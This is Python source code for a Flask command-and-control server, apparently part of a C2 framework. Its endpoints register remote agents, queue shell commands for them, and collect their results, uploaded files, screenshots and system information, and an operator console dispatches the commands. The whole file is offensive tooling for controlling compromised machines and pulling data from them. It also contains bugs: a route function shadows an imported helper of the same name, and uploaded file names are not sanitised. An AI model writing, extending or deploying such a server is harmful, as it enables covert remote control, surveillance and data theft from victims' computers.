from flask import Flask, request, jsonify
import uuid
import os
import base64
import sqlite3
import time 
import threading
from datetime import datetime
from flask import send_from_directory
from database import (
    init_db, add_agent, add_command, get_pending_command,
    mark_command_completed, add_result, get_all_agents, update_agent_last_seen
)

app = Flask(__name__)
UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
DB_FILE= "c2_framework.db"
init_db()

@app.route('/register', methods=['POST'])
def register_agent():
    data = request.get_json()
    name = data.get("name")
    if not name:
        return jsonify({"error": "Name is required"}), 400
    agent_id = str(uuid.uuid4())
    add_agent(agent_id, name)
    return jsonify({"agent_id": agent_id}), 201

@app.route('/send_command/<agent_id>', methods=['POST'])
def send_command(agent_id):
    data = request.get_json()
    command = data.get("command")
    if not command:
        return jsonify({"error": "Command is required"}), 400
    add_command(agent_id, command)
    return jsonify({"message": "Command added"}), 200

@app.route('/get_command/<agent_id>', methods=['GET'])
def get_command(agent_id):
    update_agent_last_seen(agent_id)
    cmd = get_pending_command(agent_id)
    if not cmd:
        return jsonify({"command": None}), 200
    command_id, command_text = cmd
    return jsonify({"command_id": command_id, "command": command_text})

@app.route('/result/<agent_id>', methods=['POST'])
def post_result(agent_id):
    data = request.get_json()
    result = data.get("result")
    command_id = data.get("command_id")
    if not command_id or not result:
        return jsonify({"error": "command_id and result are required"}), 400
    add_result(command_id, result)
    mark_command_completed(command_id)
    return jsonify({"message": "Result stored"}), 200

@app.route('/agents', methods=['GET'])
def list_agents():
    agents = get_all_agents()
    agents_list = [
        {"id": a[0], "name": a[1], "last_seen": a[2]}
        for a in agents
    ]
    return jsonify(agents_list), 200

@app.route("/command/<agent_id>", methods=["POST"])
def add_command(agent_id):
    """Endpoint for operator to send a command to a specific agent."""
    try:
        data = request.get_json()
        command = data.get("command")

        if not command:
            return jsonify({"error": "Command not provided"}), 400

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()

        # check if agent exists
        cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"error": "Agent not found"}), 404

        # Insert command with timestamp
        cursor.execute("""
            INSERT INTO commands (agent_id, command, status, created_at)
            VALUES (?, ?, ?, ?)
        """, (agent_id, command, "pending", timestamp))

        command_id = cursor.lastrowid
        conn.commit()
        conn.close()

        return jsonify({
            "message": "Command added",
            "command_id": command_id,
            "agent_id": agent_id,
            "command": command
        }), 201

    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ----------------------------
# New: Upload File from Agent
# ----------------------------
@app.route('/upload/<agent_id>', methods=['POST'])
def upload_file(agent_id):
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files['file']
    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    filename = f"{agent_id}_{timestamp}_{file.filename}"
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)
    return jsonify({"message": "File uploaded successfully"}), 200

# ----------------------------
# New: Serve Uploaded Files
# ----------------------------
@app.route('/uploads/<path:filename>', methods=['GET'])
def serve_file(filename):
    """Serve files from the uploads directory."""
    try:
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)
    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404

# ----------------------------
# New: Screenshot Capture
# ----------------------------
@app.route('/screenshot/<agent_id>', methods=['POST'])
def receive_screenshot(agent_id):
    data = request.get_json()
    image_b64 = data.get("screenshot")

    if not image_b64:
        return jsonify({"error": "Screenshot data missing"}), 400

    try:
        image_data = base64.b64decode(image_b64)
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        filename = f"{agent_id}_screenshot_{timestamp}.png"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(image_data)
        return jsonify({"message": "Screenshot saved"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ----------------------------
# New: System Info
# ----------------------------
@app.route('/system_info/<agent_id>', methods=['POST'])
def receive_system_info(agent_id):
    data = request.get_json()
    if not data:
        return jsonify({"error": "No system info provided"}), 400

    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    filepath = os.path.join(UPLOAD_FOLDER, f"{agent_id}_sysinfo_{timestamp}.txt")
    with open(filepath, 'w') as f:
        for key, val in data.items():
            f.write(f"{key}: {val}\n")

    return jsonify({"message": "System info received"}), 200

def run_flask():
    app.run(
        host="0.0.0.0",
        port=5000,
        ssl_context=("cert.pem", "key.pem"),
        debug=False,
        use_reloader=False
    )

def operator_cli():
    with app.app_context():
        while True:
            print("\n=== Operator CLI ===")
            print("1. List agents")
            print("2. Send command to agent")
            print("3. Exit")
            choice = input("Choose an option: ")

            if choice == "1":
                agents = get_all_agents()
                if not agents:
                    print("[!] No agents found.")
                else:
                    for a in agents:
                        print(f"- ID: {a[0]} | Name: {a[1]} | Last Seen: {a[2]}")

            elif choice == "2":
                agent_id = input("Enter agent ID: ")
                command = input("Enter command to send: ")
                
                db_path = os.path.join(os.path.dirname(__file__), 'c2_framework.db')
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                cursor.execute("INSERT INTO commands (agent_id, command, status,created_at) VALUES (?, ?,?,?)", (agent_id, command,'pending',timestamp))
                conn.commit()
                conn.close()

                print(f"[+] Command sent to {agent_id}: {command}")

            elif choice == "3":
                print("Exiting...")
                os._exit(0)  # Force exit all threads cleanly

            else:
                print("[!] Invalid choice. Try again.")


if __name__ == '__main__':
    # Run Flask app in background
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # Delay to let Flask spin up
    time.sleep(1)

    # Run the operator CLI in main thread
    operator_cli()
    
